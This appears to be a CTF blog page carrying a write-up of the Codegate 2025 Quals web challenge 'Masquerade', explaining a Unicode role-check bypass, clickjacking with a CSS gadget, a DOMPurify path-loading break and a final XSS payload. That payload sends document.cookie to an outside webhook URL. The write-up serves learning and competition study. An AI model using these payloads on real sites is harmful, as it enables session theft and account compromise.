<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>Codegate 2025 Quals - Masquerade</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-3e96d214.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-bfc7d520.css">
  <meta property="article:tag" content="Codegate 2025 Quals"><meta property="article:tag" content="web"><meta name="description" content="_Written by jia_jie and hal0g3n_

# Privilege escalation

Firstly, we have to get into the website. So we quickly register and login, and the below page shows.

![](/ctf-writeups/codegate25quals/home.png)

ðŸ¤” we are able to change our `ROLE`, but to what?

```javascript:user.js
router.post('/role', authenticateJWT, (req, res) => {
    const { role } = req.body;
    const token = setRole(req.user.uuid, role);

    if (!token) return res.status(400).json({ message: &quot;Invalid Role.&quot; });
    res.json({ message: &quot;Role Changed.&quot;, token });
});
```

The route to change role does not reveal much, so we step into `setRole` and take peek.

```javascript:userModel.js
const role_list = [&quot;ADMIN&quot;, &quot;MEMBER&quot;, &quot;INSPECTOR&quot;, &quot;DEV&quot;, &quot;BANNED&quot;];

function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

...

const setRole = (uuid, input) => {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });
    const updated = getUser(uuid);
    const payload = { uuid, ...updated }
    delete payload.password;
    const token = generateToken(payload);
    return token;
};
```
Hidden in these 3 functions, is our first exploit to obtain privilege escalation.

# Encodings

Let's breakdown `setRole()`, it performs these 3 steps:

1. `checkRole(input)` - checks the input against the regex `/^(ADMIN|INSPECTOR)$/i`
    - A convoluted way to check if `input == admin || input == inspector` (`/i` indicating case insensitive)
2. `!role_list.includes(input.toUpperCase())` - checks `input.toUpperCase()` is in the list
3. Sets `role: input.toUpperCase()`

With the title of this subsection, the missing `.toUpperCase()` in step 1 jumps out, and we can in fact abuse it. Due to how javascript handles characters and their uppercase, there are special characters mapping to `I` in `toUpperCase()`. One example is the dotless i `Ä±` (`U+0131`). So we just put our role as:

`admÄ±n` or `Ä±nspector`

And the regex would be none the wiser.

![](/ctf-writeups/codegate25quals/role_changed.png)

Now we can MASQUERADE as any role we want ðŸ˜ˆ

> `ADMIN` is used to give us permission to make posts, but not report them. We need to swap to `INSPECTOR` to report them for our XSS below

# XSS part 1

Now we are finally able to make posts and submit them to the /report endpoint, we can finally start tackling the XSS.

![Example post](/ctf-writeups/codegate25quals/post_example.png)

Looking at `index.js`, we can see the app sets a rather strict security policy:

```javascript:index.js
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('hex');

    res.setHeader(&quot;X-Frame-Options&quot;, &quot;deny&quot;);

    if (req.path.startsWith('/admin')) {
        res.setHeader(&quot;Content-Security-Policy&quot;, `default-src 'self'; script-src 'self' 'unsafe-inline'`);
    } else {
        res.setHeader(&quot;Content-Security-Policy&quot;, `default-src 'self'; script-src 'nonce-${nonce}'`);
    }

    res.locals.nonce = nonce;

    next();
});
```

Hence, although there is no sanitization performed on post content (shown below), we aren't able to execute any javascript.

```html:post/view.ejs
        <div class=&quot;post-content&quot;>
            <%- post.content %>
        </div>
```

# Dead ends

One of the first things that I tried was redirecting the bot to /admin by passing a post id like `../admin/test`, where there is a more lenient CSP that allows inline scripts. However, the /report endpoint checks that the post id is valid before continuing:

```javascript:routes/report.js
    const post_id = req.params.post_id;
    const post = getPostById(post_id);

    if (!post) return res.status(404).json({ message: &quot;Post Not Found.&quot; });
```

However, the bot does have some form of interaction with the page, which we could exploit:

```javascript:utils/report.js
        await page.goto(`http://localhost:3000/post/${post_id}`, { timeout: 3000, waitUntil: &quot;domcontentloaded&quot; });

        await delay(1000);

        const button = await page.$('#delete');
        await button.click();

        await delay(1000);
```

I tried a number of ways to exploit this behavior and redirect the bot to /admin. Looking at post/view.ejs, we can see `window.conf` being used to set the redirect url:

```javascript:post/view.ejs
        <% if (isOwner || isAdmin) { %>
            window.conf = window.conf || {
                deleteUrl: &quot;/post/delete/<%= post.post_id %>&quot;
            };
        <% } else { %>
            window.conf = window.conf || {
                deleteUrl: &quot;/error/role&quot;
            };
        <% } %>

...

        const deleteButton = document.querySelector(&quot;#delete&quot;);

        deleteButton.addEventListener(&quot;click&quot;, () => {
            location.href = window.conf.deleteUrl;
        });
```

So if we're able to set `window.conf.deleteUrl`, we can redirect to `/admin/test`. I recalled that elements can be accessed from the window object using their id, for example:

```html
<div id=&quot;conf&quot;></div>
```

and `window.conf` will point to `HTMLDivElement`. However, we also need to set the `deleteUrl` attribute. I discovered that by using a form element, we are able to set properties directly using the input names, like so:

```html
<form name=&quot;conf&quot;>
  <input name=&quot;deleteUrl&quot; value=&quot;/admin/test&quot;>
</form>
```

However, there is a problem: `window.conf.deleteUrl` points to `[object HTMLInputElement]`; we need to call `window.conf.deleteUrl.value` to get `/admin/test`. We need a html element where we can control its `toString()` value just from its html attributes alone.

Consulting my large language model of choice, I learn that `a` tags return their `href` attribute when stringified: for example, `<a href=&quot;/admin/test&quot;></a> -> &quot;/admin/test&quot;`. But submitting a post with the `a` tag triggers the mystery filter. Fortunately, there was another element that was not blacklisted: `<area>`, which similarly uses `href` as its string representation.

Unfortunately, form elements only add valid input fields as attributes: `input`, `textarea`, `select` and `button`, none of which provide a useful `toString` implementation. Having no way to add an area tag under `window.conf`, we have to abandon this approach.

I also tried using a meta tag: `<meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://example.com&quot;>`. However, the `meta` tag was also blacklisted by the app's mystery filter. (After the CTF, I learned that other participants bypassed it using slashes instead of spaces: `<meta/http-equiv=&quot;refresh&quot;/content=&quot;0;url=https://example.com&quot;>`.)

> **DOM Clobbering Solution**
>
> Reading other participants' solutions after the CTF ended, I realised it's actually possible using the following payload (from @tanknight):
>
> ```html
> <a id=conf></a>
> <a id=conf name=deleteUrl href=http://xssendpoint></a>
> ```

# Clickjacking

After doing some googling, I realised that when another element overlaps the one puppeteer is clicking, that element is clicked instead. This is because puppeteer just moves the mouse to the x/y location and clicks:

```typescript
  async click(
    this: ElementHandle<Element>,
    options: Readonly<ClickOptions> = {}
  ): Promise<void> {
    await this.scrollIntoViewIfNeeded();
    const {x, y} = await this.clickablePoint(options.offset);
    await this.frame.page().mouse.click(x, y, options);
  }
```

So if we create a massive button that covers the entire screen, it should be clicked instead of the delete button:

```html
<form action=&quot;/admin/test&quot;>
  <button type=&quot;submit&quot; style=&quot;position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;&quot;></button>
</form>
```

However, this doesn't render as expected:

![](/ctf-writeups/codegate25quals/clickjacking_1.png)

Checking the console, we see this is because of the CSP blocking inline styles:

![](/ctf-writeups/codegate25quals/style_csp_error.png)

Thus, we can only use existing styles served by the app. I checked the css files and found the following &quot;css gadget&quot;:

```css:switch.css
.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    -webkit-transition: .4s;
    transition: .4s;
}
```

Now using the following payload, the button renders correctly and gets clicked by the bot (I verified this using webhook)

```html
<link rel=&quot;stylesheet&quot; href=&quot;/css/switch.css&quot; />
<form action=&quot;https://webhook.site/26d62c0b-fd91-4f30-9f78-152de98c1012&quot;>
  <button type=&quot;submit&quot; class=&quot;slider&quot;></button>
</form>
```

Now that we can redirect to /admin/test, hopefully we have more luck with XSS there.

# XSS part 2

Achieving XSS on `/admin/test` is no easy feat, especially due to the site using DOMPurify `3.2.4`, the latest version of it. No way we are bypassing DOMPurify with a 0day.

```html:admin/test.html
<script src=&quot;../js/purify.min.js&quot;></script>
<script>
    const post_title = document.querySelector(&quot;.post_title&quot;);
    const post_content = document.querySelector(&quot;.post_content&quot;);
    const error_div = document.querySelector(&quot;.error_div&quot;);

    const urlSearch = new URLSearchParams(location.search);
    const title = urlSearch.get('title');
    const content = urlSearch.get('content');

    if (!title &amp;&amp; !content) {
        post_content.innerHTML = &quot;Usage: ?title=a&amp;content=b&quot;;
    } else {
        try {
            post_title.innerHTML = DOMPurify.sanitize(title);
            post_content.innerHTML = DOMPurify.sanitize(content);
        } catch {
            post_title.innerHTML = title;
            post_content.innerHTML = content;
        }
    }
</script>
```

However, the `try/catch` block jumps out, in such a small file, this make it seem intentional, especially when our XSS is not `DOMurify.sanitize` when there is an error.

# Relativity

`DOMPurify.sanitize` does not throw any errors, since worst comes to worst it will still output `&quot;&quot;` unless configured otherwise. There is another way to kill, and that is by removing the `DOMPurify` object completely. This sounds crazy but it is possible, especially since it is included in the _relative_ path `../js/purify.min.js`. If we could just access this same site with another route, we can effectively break this path.

This turned out to be a lot easier than expected. All we need is to include an additional slash, going to the route `/admin/test/`. That extra slash resulted in the path resolving to `/admin/test` instead of `/test` in the express backend, meaning instead of pointing to `/js/purify.min.js`, we access `/admin/js/purify.min.js`. `DOMPurify` now returns 404 and we get our unfiltered XSS.

Payload: `/admin/test/?content=<script>alert(1);</script>`

![](/ctf-writeups/codegate25quals/admin_test_xss.png)

# Final Payload

```html
<link rel=&quot;stylesheet&quot; href=&quot;/css/switch.css&quot; />
<form action=&quot;/admin/test/&quot;>
  <input
    type=&quot;hidden&quot;
    name=&quot;content&quot;
    value=&quot;<img src=x onerror=location.href=`https:\/\/webhook.site\/26d62c0b-fd91-4f30-9f78-152de98c1012?t=${document.cookie}`>&quot;
  />
  <button type=&quot;submit&quot; class=&quot;slider&quot;></button>
</form>
```

We add the `/` to the form action as well as our XSS attack in the post, and we obtain our jwt with the flag:

`codegate2025{16a7eeb64ec6b150c9308509a039cec0c137dfd766ef13ccb8d6d9e0cf54aef3}`
"><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a aria-current="page" href="/ctf-writeups/masquerade" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Codegate 2025 Quals</span><!--[--><a aria-current="page" href="/ctf-writeups/masquerade" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Masquerade</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 